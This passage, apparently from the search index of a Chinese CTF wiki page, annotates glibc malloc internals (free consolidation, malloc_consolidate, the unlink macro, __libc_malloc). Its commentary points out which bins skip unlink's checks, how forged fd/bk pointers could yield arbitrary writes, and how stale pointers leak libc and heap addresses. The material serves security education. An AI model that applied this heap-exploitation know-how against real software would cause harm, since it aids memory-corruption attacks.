\u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u89e6\u53d1unlink \u9996\u5148\u6211\u4eec\u5148\u8bf4\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u5408\u5e76chunk\uff0c\u8fd9\u662f\u4e3a\u4e86\u907f\u514dheap\u4e2d\u6709\u592a\u591a\u96f6\u96f6\u788e\u788e\u7684\u5185\u5b58\u5757\uff0c\u5408\u5e76\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u5e94\u5bf9\u66f4\u5927\u7684\u5185\u5b58\u5757\u8bf7\u6c42\u3002\u5408\u5e76\u7684\u4e3b\u8981\u987a\u5e8f\u4e3a \u5148\u8003\u8651\u7269\u7406\u4f4e\u5730\u5740\u7a7a\u95f2\u5757 \u540e\u8003\u8651\u7269\u7406\u9ad8\u5730\u5740\u7a7a\u95f2\u5757 \u5408\u5e76\u540e\u7684 chunk \u6307\u5411\u5408\u5e76\u7684 chunk \u7684\u4f4e\u5730\u5740\u3002 \u5728\u6ca1\u6709\u9501\u7684\u60c5\u51b5\u4e0b\uff0c\u5148\u83b7\u5f97\u9501\u3002 /* Consolidate other non-mmapped chunks as they arrive. */ else if ( ! chunk_is_mmapped ( p )) { if ( ! have_lock ) { __libc_lock_lock ( av -> mutex ); locked = 1 ; } nextchunk = chunk_at_offset ( p , size ); \u8f7b\u91cf\u7ea7\u7684\u68c0\u6d4b \u00b6 /* Lightweight tests: check whether the block is already the top block. */ // \u5f53\u524dfree\u7684chunk\u4e0d\u80fd\u662ftop chunk if ( __glibc_unlikely ( p == av -> top )) { errstr = \"double free or corruption (top)\" ; goto errout ; } // \u5f53\u524dfree\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u4e0d\u80fd\u8d85\u8fc7arena\u7684\u8fb9\u754c /* Or whether the next chunk is beyond the boundaries of the arena. */ if ( __builtin_expect ( contiguous ( av ) && ( char * ) nextchunk >= (( char * ) av -> top + chunksize ( av -> top )), 0 )) { errstr = \"double free or corruption (out)\" ; goto errout ; } // \u5f53\u524d\u8981free\u7684chunk\u7684\u4f7f\u7528\u6807\u8bb0\u6ca1\u6709\u88ab\u6807\u8bb0\uff0cdouble free /* Or whether the block is actually not marked used. */ if ( __glibc_unlikely ( ! prev_inuse ( nextchunk ))) { errstr = \"double free or corruption (!prev)\" ; goto errout ; } // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f nextsize = chunksize ( nextchunk ); // next chunk size valid check // \u5224\u65ad\u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u662f\u5426\u4e0d\u5927\u4e8e2*SIZE_SZ\uff0c\u6216\u8005 // nextsize\u662f\u5426\u5927\u4e8e\u7cfb\u7edf\u53ef\u63d0\u4f9b\u7684\u5185\u5b58 if ( __builtin_expect ( chunksize_nomask ( nextchunk ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( nextsize >= av -> system_mem , 0 )) { errstr = \"free(): invalid next size (normal)\" ; goto errout ; } \u91ca\u653e\u586b\u5145 \u00b6 //\u5c06\u6307\u9488\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ ); \u540e\u5411\u5408\u5e76-\u5408\u5e76\u4f4e\u5730\u5740 chunk \u00b6 /* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( av , p , bck , fwd ); } \u4e0b\u4e00\u5757\u4e0d\u662ftop chunk-\u524d\u5411\u5408\u5e76-\u5408\u5e76\u9ad8\u5730\u5740chunk \u00b6 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u5757\u4e0d\u662f top chunk \u540e\uff0c\u5219\u5408\u5e76\u9ad8\u5730\u5740\u7684 chunk \uff0c\u5e76\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u5165\u5230unsorted bin\u4e2d\u3002 // \u5982\u679c\u4e0b\u4e00\u4e2achunk\u4e0d\u662ftop chunk if ( nextchunk != av -> top ) { /* get and clear inuse bit */ // \u83b7\u53d6\u4e0b\u4e00\u4e2a chunk \u7684\u4f7f\u7528\u72b6\u6001 nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); // \u5982\u679c\u4e0d\u5728\u4f7f\u7528\uff0c\u5408\u5e76\uff0c\u5426\u5219\u6e05\u7a7a\u5f53\u524dchunk\u7684\u4f7f\u7528\u72b6\u6001\u3002 /* consolidate forward */ if ( ! nextinuse ) { unlink ( av , nextchunk , bck , fwd ); size += nextsize ; } else clear_inuse_bit_at_offset ( nextchunk , 0 ); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ // \u628a chunk \u653e\u5728 unsorted chunk \u94fe\u8868\u7684\u5934\u90e8 bck = unsorted_chunks ( av ); fwd = bck -> fd ; // \u7b80\u5355\u7684\u68c0\u67e5 if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"free(): corrupted unsorted chunks\" ; goto errout ; } p -> fd = fwd ; p -> bk = bck ; // \u5982\u679c\u662f large chunk\uff0c\u90a3\u5c31\u8bbe\u7f6enextsize\u6307\u9488\u5b57\u6bb5\u4e3aNULL\u3002 if ( ! in_smallbin_range ( size )) { p -> fd_nextsize = NULL ; p -> bk_nextsize = NULL ; } bck -> fd = p ; fwd -> bk = p ; set_head ( p , size | PREV_INUSE ); set_foot ( p , size ); check_free_chunk ( av , p ); } \u4e0b\u4e00\u5757\u662ftop chunk-\u5408\u5e76\u5230top chunk \u00b6 /* If the chunk borders the current high end of memory, consolidate into top */ // \u5982\u679c\u8981\u91ca\u653e\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u90a3\u5c31\u5408\u5e76\u5230 top chunk else { size += nextsize ; set_head ( p , size | PREV_INUSE ); av -> top = p ; check_chunk ( av , p ); } \u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58 \u00b6 /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ // \u5982\u679c\u5408\u5e76\u540e\u7684 chunk \u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD // \u4e00\u822c\u5408\u5e76\u5230 top chunk \u90fd\u4f1a\u6267\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\u3002 // \u90a3\u5c31\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58 if (( unsigned long ) ( size ) >= FASTBIN_CONSOLIDATION_THRESHOLD ) { // \u5982\u679c\u6709 fast chunk \u5c31\u8fdb\u884c\u5408\u5e76 if ( have_fastchunks ( av )) malloc_consolidate ( av ); // \u4e3b\u5206\u914d\u533a if ( av == & main_arena ) { #ifndef MORECORE_CANNOT_TRIM // top chunk \u5927\u4e8e\u5f53\u524d\u7684\u6536\u7f29\u9619\u503c if (( unsigned long ) ( chunksize ( av -> top )) >= ( unsigned long ) ( mp_ . trim_threshold )) systrim ( mp_ . top_pad , av ); #endif // \u975e\u4e3b\u5206\u914d\u533a\uff0c\u5219\u76f4\u63a5\u6536\u7f29heap } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info * heap = heap_for_ptr ( top ( av )); assert ( heap -> ar_ptr == av ); heap_trim ( heap , mp_ . top_pad ); } } if ( ! have_lock ) { assert ( locked ); __libc_lock_unlock ( av -> mutex ); } \u91ca\u653emmap\u7684chunk \u00b6 } else { // If the chunk was allocated via mmap, release via munmap(). munmap_chunk ( p ); } systrim \u00b6 heap_trim \u00b6 munmap_chunk \u00b6 \u5220\u9664\u5806 \u00b6 malloc_state \u76f8\u5173\u51fd\u6570 \u00b6 malloc_init_state \u00b6 /* Initialize a malloc_state struct. This is called only from within malloc_consolidate, which needs be called in the same contexts anyway. It is never called directly outside of malloc_consolidate because some optimizing compilers try to inline it at all call points, which turns out not to be an optimization at all. (Inlining it in malloc_consolidate is fine though.) */ static void malloc_init_state ( mstate av ) { int i ; mbinptr bin ; /* Establish circular links for normal bins */ for ( i = 1 ; i < NBINS ; ++ i ) { bin = bin_at ( av , i ); bin -> fd = bin -> bk = bin ; } #if MORECORE_CONTIGUOUS if ( av != & main_arena ) #endif set_noncontiguous ( av ); if ( av == & main_arena ) set_max_fast ( DEFAULT_MXFAST ); // \u8bbe\u7f6e flags \u6807\u8bb0\u76ee\u524d\u6ca1\u6709fast chunk av -> flags |= FASTCHUNKS_BIT ; // \u5c31\u662f unsorted bin av -> top = initial_top ( av ); } malloc_consolidate \u00b6 \u8be5\u51fd\u6570\u4e3b\u8981\u6709\u4e24\u4e2a\u529f\u80fd \u82e5 fastbin \u672a\u521d\u59cb\u5316\uff0c\u5373 global_max_fast \u4e3a0\uff0c\u90a3\u5c31\u521d\u59cb\u5316 malloc_state\u3002 \u5982\u679c\u5df2\u7ecf\u521d\u59cb\u5316\u7684\u8bdd\uff0c\u5c31\u5408\u5e76 fastbin \u4e2d\u7684 chunk\u3002 \u57fa\u672c\u7684\u6d41\u7a0b\u5982\u4e0b \u521d\u59cb \u00b6 static void malloc_consolidate ( mstate av ) { mfastbinptr * fb ; /* current fastbin being consolidated */ mfastbinptr * maxfb ; /* last fastbin (for loop control) */ mchunkptr p ; /* current chunk being consolidated */ mchunkptr nextp ; /* next chunk to consolidate */ mchunkptr unsorted_bin ; /* bin header */ mchunkptr first_unsorted ; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk ; INTERNAL_SIZE_T size ; INTERNAL_SIZE_T nextsize ; INTERNAL_SIZE_T prevsize ; int nextinuse ; mchunkptr bck ; mchunkptr fwd ; \u5408\u5e76 chunk \u00b6 /* If max_fast is 0, we know that av hasn't yet been initialized, in which case do so below */ // \u8bf4\u660e fastbin \u5df2\u7ecf\u521d\u59cb\u5316 if ( get_max_fast () != 0 ) { // \u6e05\u7a7a fastbin \u6807\u8bb0 // \u56e0\u4e3a\u8981\u5408\u5e76 fastbin \u4e2d\u7684 chunk \u4e86\u3002 clear_fastchunks ( av ); // unsorted_bin = unsorted_chunks ( av ); /* Remove each chunk from fast bin and consolidate it, placing it then in unsorted bin. Among other reasons for doing this, placing in unsorted bin avoids needing to calculate actual bins until malloc is sure that chunks aren't immediately going to be reused anyway. */ // \u6309\u7167 fd \u987a\u5e8f\u904d\u5386 fastbin \u7684\u6bcf\u4e00\u4e2a bin\uff0c\u5c06 bin \u4e2d\u7684\u6bcf\u4e00\u4e2a chunk \u5408\u5e76\u6389\u3002 maxfb = & fastbin ( av , NFASTBINS - 1 ); fb = & fastbin ( av , 0 ); do { p = atomic_exchange_acq ( fb , NULL ); if ( p != 0 ) { do { check_inuse_chunk ( av , p ); nextp = p -> fd ; /* Slightly streamlined version of consolidation code in * free() */ size = chunksize ( p ); nextchunk = chunk_at_offset ( p , size ); nextsize = chunksize ( nextchunk ); if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( av , p , bck , fwd ); } if ( nextchunk != av -> top ) { // \u5224\u65ad nextchunk \u662f\u5426\u662f\u7a7a\u95f2\u7684\u3002 nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); if ( ! nextinuse ) { size += nextsize ; unlink ( av , nextchunk , bck , fwd ); } else // \u8bbe\u7f6e nextchunk \u7684 prev inuse \u4e3a0\uff0c\u4ee5\u8868\u660e\u53ef\u4ee5\u5408\u5e76\u5f53\u524d fast chunk\u3002 clear_inuse_bit_at_offset ( nextchunk , 0 ); first_unsorted = unsorted_bin -> fd ; unsorted_bin -> fd = p ; first_unsorted -> bk = p ; if ( ! in_smallbin_range ( size )) { p -> fd_nextsize = NULL ; p -> bk_nextsize = NULL ; } set_head ( p , size | PREV_INUSE ); p -> bk = unsorted_bin ; p -> fd = first_unsorted ; set_foot ( p , size ); } else { size += nextsize ; set_head ( p , size | PREV_INUSE ); av -> top = p ; } } while (( p = nextp ) != 0 ); } } while ( fb ++ != maxfb ); \u521d\u59cb\u5316 \u00b6 \u8bf4\u660e fastbin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 } else { malloc_init_state ( av ); // \u5728\u975e\u8c03\u8bd5\u60c5\u51b5\u4e0b\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u5728\u8c03\u8bd5\u60c5\u51b5\u4e0b\uff0c\u505a\u4e00\u4e9b\u68c0\u6d4b\u3002 check_malloc_state ( av ); } \u6d4b\u8bd5\u652f\u6301 \u00b6 \u4e0b\u9762\u7684\u4ee3\u7801\u7528\u4e8e\u652f\u6301\u6d4b\u8bd5\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b perturb_byte \u662f0\u3002 static int perturb_byte ; static void alloc_perturb ( char * p , size_t n ) { if ( __glibc_unlikely ( perturb_byte )) memset ( p , perturb_byte ^ 0xff , n ); } static void free_perturb ( char * p , size_t n ) { if ( __glibc_unlikely ( perturb_byte )) memset ( p , perturb_byte , n ); }","title":"\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0"},{"location":"pwn/heap/heap_implementation_details/#_1","text":"\u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u4efb\u4f55\u5806\u7684\u5b9e\u73b0\u90fd\u9700\u8981\u4ece\u4ee5\u4e0b\u4e24\u4e2a\u89d2\u5ea6\u8003\u8651\u76f8\u5e94\u7684\u95ee\u9898 \u5b8f\u89c2\u89d2\u5ea6 \u521b\u5efa\u5806 \u5806\u521d\u59cb\u5316 \u5220\u9664\u5806 \u5fae\u89c2\u89d2\u5ea6 \u7533\u8bf7\u5185\u5b58\u5757 \u91ca\u653e\u5185\u5b58\u5757 \u5f53\u7136\uff0c\u8fd9\u4e9b\u90fd\u662f\u6bd4\u8f83\u9ad8\u5c42\u9762\u7684\u60f3\u6cd5\uff0c\u4e0d\u540c\u7684\u5806\u7684\u5e95\u5c42\u5b9e\u73b0\u4f1a\u6709\u6240\u4e0d\u540c\u3002","title":"\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0"},{"location":"pwn/heap/heap_implementation_details/#_2","text":"","title":"\u5806\u5b9e\u73b0\u6982\u89c8"},{"location":"pwn/heap/heap_implementation_details/#_3","text":"\u5806\u521d\u59cb\u5316\u662f\u5728\u7528\u6237\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\u6267\u884c malloc_consolidate \u518d\u6267\u884c malloc_init_state \u5b9e\u73b0\u7684\u3002\u8fd9\u91cc\u4e0d\u505a\u8fc7\u591a\u8bb2\u89e3\u3002\u53ef\u4ee5\u53c2\u89c1 malloc_state \u76f8\u5173\u51fd\u6570 \u3002","title":"\u5806\u521d\u59cb\u5316"},{"location":"pwn/heap/heap_implementation_details/#_4","text":"","title":"\u521b\u5efa\u5806"},{"location":"pwn/heap/heap_implementation_details/#_5","text":"","title":"\u53cc\u5411\u94fe\u8868\u76f8\u5173\u64cd\u4f5c"},{"location":"pwn/heap/heap_implementation_details/#unlink","text":"unlink \u7528\u6765\u5c06\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff08\u53ea\u5b58\u50a8\u7a7a\u95f2\u7684 chunk\uff09\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\u53d6\u51fa\u6765\uff0c\u53ef\u80fd\u5728\u4ee5\u4e0b\u5730\u65b9\u4f7f\u7528 malloc \u4ece\u6070\u597d\u5927\u5c0f\u5408\u9002\u7684 large bin \u4e2d\u83b7\u53d6 chunk\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f fastbin \u4e0e small bin \u5c31\u6ca1\u6709\u4f7f\u7528 unlink\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6f0f\u6d1e\u4f1a\u7ecf\u5e38\u51fa\u73b0\u5728\u5b83\u4eec\u8fd9\u91cc\u7684\u539f\u56e0\u3002 \u4f9d\u6b21\u904d\u5386\u5904\u7406 unsorted bin \u65f6\u4e5f\u6ca1\u6709\u4f7f\u7528 unlink \u7684\u3002 \u4ece\u6bd4\u8bf7\u6c42\u7684 chunk \u6240\u5728\u7684 bin \u5927\u7684 bin \u4e2d\u53d6 chunk\u3002 Free \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 malloc_consolidate \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 realloc \u524d\u5411\u6269\u5c55\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86top chunk\uff09\u3002 \u7531\u4e8e unlink \u4f7f\u7528\u975e\u5e38\u9891\u7e41\uff0c\u6240\u4ee5 unlink \u88ab\u5b9e\u73b0\u4e3a\u4e86\u4e00\u4e2a\u5b8f\uff0c\u5982\u4e0b /* Take a chunk off a bin list */ // unlink p #define unlink(AV, P, BK, FD) { \\ // \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ FD = P -> fd ; \\ BK = P -> bk ; \\ // \u9632\u6b62\u653b\u51fb\u8005\u7b80\u5355\u7be1\u6539\u7a7a\u95f2\u7684 chunk \u7684 fd \u4e0e bk \u6765\u5b9e\u73b0\u4efb\u610f\u5199\u7684\u6548\u679c\u3002 if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ else { \\ FD -> bk = BK ; \\ BK -> fd = FD ; \\ // \u4e0b\u9762\u4e3b\u8981\u8003\u8651 P \u5bf9\u5e94\u7684 nextsize \u53cc\u5411\u94fe\u8868\u7684\u4fee\u6539 if ( ! in_smallbin_range ( chunksize_nomask ( P )) \\ // \u5982\u679cP->fd_nextsize\u4e3a NULL\uff0c\u8868\u660e P \u672a\u63d2\u5165\u5230 nextsize \u94fe\u8868\u4e2d\u3002 // \u90a3\u4e48\u5176\u5b9e\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u5bf9 nextsize \u5b57\u6bb5\u8fdb\u884c\u4fee\u6539\u4e86\u3002 // \u8fd9\u91cc\u6ca1\u6709\u53bb\u5224\u65ad bk_nextsize \u5b57\u6bb5\uff0c\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u3002 && __builtin_expect ( P -> fd_nextsize != NULL , 0 )) { \\ // \u7c7b\u4f3c\u4e8e\u5c0f\u7684 chunk \u7684\u68c0\u67e5\u601d\u8def if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \\ // \u8fd9\u91cc\u8bf4\u660e P \u5df2\u7ecf\u5728 nextsize \u94fe\u8868\u4e2d\u4e86\u3002 // \u5982\u679c FD \u6ca1\u6709\u5728 nextsize \u94fe\u8868\u4e2d if ( FD -> fd_nextsize == NULL ) { \\ // \u5982\u679c nextsize \u4e32\u8d77\u6765\u7684\u53cc\u94fe\u8868\u53ea\u6709 P \u672c\u8eab\uff0c\u90a3\u5c31\u76f4\u63a5\u62ff\u8d70 P // \u4ee4 FD \u4e3a nextsize \u4e32\u8d77\u6765\u7684 if ( P -> fd_nextsize == P ) \\ FD -> fd_nextsize = FD -> bk_nextsize = FD ; \\ else { \\ // \u5426\u5219\u6211\u4eec\u9700\u8981\u5c06 FD \u63d2\u5165\u5230 nextsize \u5f62\u6210\u7684\u53cc\u94fe\u8868\u4e2d FD -> fd_nextsize = P -> fd_nextsize ; \\ FD -> bk_nextsize = P -> bk_nextsize ; \\ P -> fd_nextsize -> bk_nextsize = FD ; \\ P -> bk_nextsize -> fd_nextsize = FD ; \\ } \\ } else { \\ // \u5982\u679c\u5728\u7684\u8bdd\uff0c\u76f4\u63a5\u62ff\u8d70\u5373\u53ef P -> fd_nextsize -> bk_nextsize = P -> bk_nextsize ; \\ P -> bk_nextsize -> fd_nextsize = P -> fd_nextsize ; \\ } \\ } \\ } \\ } \u8fd9\u91cc\u6211\u4eec\u4ee5 small bin \u7684 unlink \u4e3a\u4f8b\u5b50\u4ecb\u7ecd\u4e00\u4e0b\u3002\u5bf9\u4e8e large bin \u7684 unlink\uff0c\u4e0e\u5176\u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2anextsize \u7684\u5904\u7406\u3002 \u53ef\u4ee5\u770b\u51fa\uff0c P \u6700\u540e\u7684 fd \u548c bk \u6307\u9488\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316 \uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\u65f6\uff0c\u5df2\u7ecf\u904d\u5386\u4e0d\u5230\u5bf9\u5e94\u7684\u94fe\u8868\u4e86\u3002\u8fd9\u4e00\u70b9\u6ca1\u6709\u53d8\u5316\u8fd8\u662f\u5f88\u6709\u7528\u5904\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u6709\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u6cc4\u6f0f\u5730\u5740 libc \u5730\u5740 P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cbk \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cfd \u6cc4\u6f0f \u53cc\u5411\u94fe\u8868\u53ea\u5305\u542b\u4e00\u4e2a\u7a7a\u95f2 chunk \u65f6\uff0cP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f \u6cc4\u6f0f\u5806\u5730\u5740\uff0c\u53cc\u5411\u94fe\u8868\u5305\u542b\u591a\u4e2a\u7a7a\u95f2 chunk P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cfd \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cbk \u6cc4\u6f0f \u6ce8\u610f \u8fd9\u91cc\u7684\u5934\u90e8\u6307\u7684\u662f bin \u7684 fd \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u65b0\u52a0\u5165\u7684 chunk\u3002 \u8fd9\u91cc\u7684\u5c3e\u90e8\u6307\u7684\u662f bin \u7684 bk \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u5148\u52a0\u5165\u7684 chunk\u3002 \u540c\u65f6\uff0c\u5bf9\u4e8e\u65e0\u8bba\u662f\u5bf9\u4e8e fd\uff0cbk \u8fd8\u662f fd_nextsize \uff0cbk_nextsize\uff0c\u7a0b\u5e8f\u90fd\u4f1a\u68c0\u6d4b fd \u548c bk \u662f\u5426\u6ee1\u8db3\u5bf9\u5e94\u7684\u8981\u6c42\u3002 // fd bk if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ // next_size related if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6b63\u5e38\u3002\u6211\u4eec\u4ee5 fd \u548c bk \u4e3a\u4f8b\uff0cP \u7684 forward chunk \u7684 bk \u5f88\u81ea\u7136\u662f P \uff0c\u540c\u6837 P \u7684 backward chunk \u7684 fd \u4e5f\u5f88\u81ea\u7136\u662f P \u3002\u5982\u679c\u6ca1\u6709\u505a\u76f8\u5e94\u7684\u68c0\u67e5\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 P \u7684 fd \u4e0e bk\uff0c\u4ece\u800c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53c2\u89c1\u5229\u7528\u90e8\u5206\u7684 unlink \u3002 \u6ce8\u610f\uff1a\u5806\u7684\u7b2c\u4e00\u4e2a chunk \u6240\u8bb0\u5f55\u7684 prev_inuse \u4f4d\u9ed8\u8ba4\u4e3a1\u3002","title":"unlink"},{"location":"pwn/heap/heap_implementation_details/#_6","text":"\u4e00\u822c\u6211\u4eec\u4f1a\u4f7f\u7528 malloc \u51fd\u6570\u6765\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u53ef\u662f\u5f53\u4ed4\u7ec6\u770b glibc \u7684\u6e90\u7801\u5b9e\u73b0\u65f6\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709malloc \u51fd\u6570\u3002\u5176\u5b9e\u8be5\u51fd\u6570\u771f\u6b63\u8c03\u7528\u7684\u662f __libc_malloc \u51fd\u6570\u3002\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u5199\u4e2a malloc \u51fd\u6570\u5462\uff0c\u56e0\u4e3a\u6709\u65f6\u5019\u6211\u4eec\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c__libc_malloc \u51fd\u6570\u53ea\u662f\u7528\u6765\u7b80\u5355\u5c01\u88c5 _int_malloc \u51fd\u6570\u3002_int_malloc \u624d\u662f\u7533\u8bf7\u5185\u5b58\u5757\u7684\u6838\u5fc3\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u5b9e\u73b0\u3002","title":"\u7533\u8bf7\u5185\u5b58\u5757"},{"location":"pwn/heap/heap_implementation_details/#__libc_malloc","text":"\u8be5\u51fd\u6570\u4f1a\u9996\u5148\u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u94a9\u5b50\u51fd\u6570\uff08__malloc_hook\uff09\uff0c\u8fd9\u4e2a\u4e3b\u8981\u7528\u4e8e\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u51fd\u6570\uff0c\u65b9\u4fbf\u7528\u6237\u5feb\u901f\u4fee\u6539\u5bf9\u5206\u914d\u51fd\u6570\u5e76\u8fdb\u884c\u6d4b\u8bd5\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570 \u3002 // wapper for int_malloc void * __libc_malloc ( size_t bytes ) { mstate ar_ptr ; void * victim ; // \u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u94a9\u5b50\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de. void * ( * hook )( size_t , const void * ) = atomic_forced_read ( __malloc_hook ); if ( __builtin_expect ( hook != NULL , 0 )) return ( * hook )( bytes , RETURN_ADDRESS ( 0 )); \u63a5\u7740\u4f1a\u5bfb\u627e\u4e00\u4e2a arena \u6765\u8bd5\u56fe\u5206\u914d\u5185\u5b58\u3002 arena_get ( ar_ptr , bytes ); \u7136\u540e\u8c03\u7528 _int_malloc \u51fd\u6570\u53bb\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\u3002 victim = _int_malloc ( ar_ptr , bytes ); \u5982\u679c\u5206\u914d\u5931\u8d25\u7684\u8bdd\uff0cptmalloc \u4f1a\u5c1d\u8bd5\u518d\u53bb\u5bfb\u627e\u4e00\u4e2a\u53ef\u7528\u7684 arena\uff0c\u5e76\u5206\u914d\u5185\u5b58\u3002 /* Retry with another arena only if we were able to find a usable arena 